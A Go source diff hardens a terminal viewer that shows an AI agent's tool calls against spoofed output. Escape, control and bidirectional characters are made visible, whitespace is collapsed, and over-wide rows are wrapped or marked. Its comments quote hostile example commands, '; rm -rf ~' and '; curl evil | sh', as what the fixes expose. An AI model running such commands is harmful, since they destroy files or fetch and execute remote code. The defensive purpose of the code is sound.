@@ -5,8 +5,10 @@ import (
 	"fmt"
 	"regexp"
 	"strings"
+	"unicode/utf8"
 
 	"github.com/charmbracelet/lipgloss"
+	"github.com/mattn/go-runewidth"
 )
 
 // codingTools are the tools a coding session works through. Their calls
@@ -35,30 +37,55 @@ type toolLine struct {
 }
 
 var (
-	chatToolHeadStyle = lipgloss.NewStyle().Foreground(lipgloss.Color("250"))
+	chatToolHeadStyle = lipgloss.NewStyle().Foreground(lipgloss.Color("252")).Bold(true)
 	chatToolBodyStyle = lipgloss.NewStyle().Foreground(lipgloss.Color("245"))
 )
 
-// terminalControl matches what a terminal would act on rather than print:
-// CSI and OSC sequences (7-bit and C1 forms, OSC ended by BEL or ST), any
-// other two-byte ESC sequence, and the remaining C0/C1 control characters
-// except tab and newline.
-var terminalControl = regexp.MustCompile(
-	"\x1b\\[[0-?]*[ -/]*[@-~]" + // CSI
-		"|\u009b[0-?]*[ -/]*[@-~]" + // C1 CSI
-		"|(?:\x1b\\]|\u009d)[^\x07\x1b\u009c]*(?:\x07|\x1b\\\\|\u009c)?" + // OSC, terminated or cut off
-		"|\x1b[ -/]*[0-~]?" + // any other ESC sequence, or a lone ESC
-		"|[\x00-\x08\x0b\x0c\x0e-\x1f\x7f\u0080-\u009f]")
+// bidiControls reorder the text a terminal shows (Trojan Source,
+// CVE-2021-42574): what the operator reads would not be what runs.
+var bidiControls = map[rune]bool{
+	'\u061c': true, '\u200e': true, '\u200f': true,
+	'\u202a': true, '\u202b': true, '\u202c': true, '\u202d': true, '\u202e': true,
+	'\u2066': true, '\u2067': true, '\u2068': true, '\u2069': true,
+}
 
 // neutralise makes model- or program-controlled text safe to print to the
-// operator's terminal. Escape sequences are removed (an OSC 52 would write
-// their clipboard, an OSC 0 their title), and a carriage return that is not
-// part of a line ending becomes a line break: overwriting a row is how
-// "rm -rf ~" hides behind "ls", so every byte of text stays visible.
+// operator's terminal by SHOWING every character a terminal would act on,
+// never deleting it: a deleted control takes what it hides with it, and a
+// parser that skips "the rest of the sequence" is exactly how "; rm -rf ~"
+// disappears behind an unterminated OSC (#83 review). Each rune is mapped
+// on its own, so nothing next to a control is ever consumed:
+//   - C0 controls and DEL become their Unicode control pictures (ESC is ␛);
+//   - C1 controls, bidi controls and bytes that are not UTF-8 become
+//     <U+XXXX> or <XX>;
+//   - a carriage return that is not part of a line ending becomes a line
+//     break, so a row cannot be overwritten;
+//   - tab and newline stay.
 func neutralise(s string) string {
 	s = strings.ReplaceAll(s, "\r\n", "\n")
-	s = strings.ReplaceAll(s, "\r", "\n")
-	return terminalControl.ReplaceAllString(s, "")
+	var b strings.Builder
+	b.Grow(len(s))
+	for i := 0; i < len(s); {
+		r, size := utf8.DecodeRuneInString(s[i:])
+		switch {
+		case r == utf8.RuneError && size == 1:
+			fmt.Fprintf(&b, "<%02X>", s[i])
+		case r == '\n' || r == '\t':
+			b.WriteRune(r)
+		case r == '\r':
+			b.WriteByte('\n')
+		case r < 0x20:
+			b.WriteRune(0x2400 + r)
+		case r == 0x7f:
+			b.WriteRune('␡')
+		case (r >= 0x80 && r <= 0x9f) || bidiControls[r]:
+			fmt.Fprintf(&b, "<U+%04X>", r)
+		default:
+			b.WriteRune(r)
+		}
+		i += size
+	}
+	return b.String()
 }
 
 // isCodingTool reports whether name is one of codingTools.
@@ -85,7 +112,7 @@ func toolHeadline(tool, args string) string {
 		Remote  string `json:"remote"`
 	}
 	if json.Unmarshal([]byte(args), &a) != nil {
-		return neutralise(fmt.Sprintf("⚙ %s(%s)", tool, truncateForChat(args, 60)))
+		return strings.Join(strings.Fields(neutralise(fmt.Sprintf("⚙ %s(%s)", tool, truncateForChat(args, 60)))), " ")
 	}
 	var head string
 	switch tool {
@@ -114,7 +141,10 @@ func toolHeadline(tool, args string) string {
 	default:
 		head = fmt.Sprintf("⚙ %s(%s)", tool, truncateForChat(args, 60))
 	}
-	return neutralise(head)
+	// One line, every whitespace run one space: the viewport cuts a row at
+	// the pane width without a marker, so 130 spaces before "; curl evil |
+	// sh" would hide it (#83 review).
+	return strings.Join(strings.Fields(neutralise(head)), " ")
 }
 
 // readRange is a read's line range as path:first-last, or path:first when
@@ -210,7 +240,7 @@ func (e *chatEntry) toolCallLines(expanded bool) []toolLine {
 	head := toolLine{text: toolHeadline(e.tool, e.detail), style: chatToolHeadStyle}
 	if e.outcome == nil {
 		if expanded && !codingTools[e.tool] {
-			head.text = neutralise(fmt.Sprintf("⚙ %s(%s)", e.tool, e.detail))
+			head.text = strings.Join(strings.Fields(neutralise(fmt.Sprintf("⚙ %s(%s)", e.tool, e.detail))), " ")
 		}
 		return []toolLine{head}
 	}
@@ -249,7 +279,11 @@ func shellLines(head toolLine, res shellOutcome, expanded bool) (toolLine, []too
 	if res.Error != "" {
 		head.text += " · " + neutralise(collapseNewlines(res.Error))
 	}
-	output := res.Stdout + res.Stderr
+	output := res.Stdout
+	if output != "" && res.Stderr != "" && !strings.HasSuffix(output, "\n") {
+		output += "\n"
+	}
+	output += res.Stderr
 	var note []string
 	if res.OutputFile != "" {
 		output = res.FirstPage
@@ -303,18 +337,55 @@ func resultLines(tool string, head toolLine, result string, expanded bool) (tool
 
 // renderToolCall is a call entry's rows, each after the timestamp's width
 // so the body lines up under the headline.
-func (e *chatEntry) renderToolCall(ts string, expanded bool) string {
+func (e *chatEntry) renderToolCall(ts string, expanded bool, width int) string {
 	lines := e.toolCallLines(expanded)
 	pad := strings.Repeat(" ", lipgloss.Width(ts))
+	avail := width - lipgloss.Width(ts) - 1
 	rows := make([]string, 0, len(lines))
 	for i, l := range lines {
-		lead := pad
-		if i == 0 {
-			lead = ts
+		for j, part := range fitToolRow(l.text, avail, expanded) {
+			lead := pad
+			if i == 0 && j == 0 {
+				lead = ts
+			}
+			rows = append(rows, lead+" "+l.style.Render(part))
 		}
-		rows = append(rows, lead+" "+l.style.Render(l.text))
 	}
 	return strings.Join(rows, "\n")
+}
+
+// fitToolRow fits one row to the width the pane leaves it. The viewport
+// cuts an over-wide row at the edge and says nothing, so a row that does
+// not fit is cut with a visible "…" collapsed, and wrapped onto rows
+// indented two more columns expanded: never silently shortened (#83
+// review). A width of 0 or less means the pane is not laid out yet.
+func fitToolRow(text string, avail int, expanded bool) []string {
+	text = strings.ReplaceAll(text, "\t", "    ")
+	if avail <= 0 || runewidth.StringWidth(text) <= avail {
+		return []string{text}
+	}
+	if !expanded {
+		return []string{runewidth.Truncate(text, avail, "…")}
+	}
+	indent := strings.Repeat(" ", len(text)-len(strings.TrimLeft(text, " "))+2)
+	if len(indent) >= avail {
+		indent = ""
+	}
+	var rows []string
+	var row strings.Builder
+	limit, used := avail, 0
+	for _, r := range text {
+		w := runewidth.RuneWidth(r)
+		if used+w > limit {
+			rows = append(rows, row.String())
+			row.Reset()
+			row.WriteString(indent)
+			limit, used = avail, len(indent)
+		}
+		row.WriteRune(r)
+		used += w
+	}
+	return append(rows, row.String())
 }
 
 // toolLines is the text of a tool entry, unstyled.
